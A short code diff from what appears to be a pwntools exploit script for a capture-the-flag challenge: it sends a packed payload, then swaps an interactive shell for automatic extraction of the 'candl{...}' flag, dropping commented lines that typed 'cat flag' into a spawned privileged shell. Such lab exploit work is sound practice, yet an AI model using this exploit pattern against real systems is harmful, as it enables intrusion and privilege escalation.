@@ -74,12 +74,7 @@ payload = flat(
         p32(max_len)
 )
 io.sendline(payload)
-io.interactive()
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
 
-# END CHALLENGE-SPECIFIC CODE
-# BEGIN FLAG RETRIEVAL BOILERPLATE
-
-# import re
-# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
-# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-# print(flag)
+os.unlink("./z")
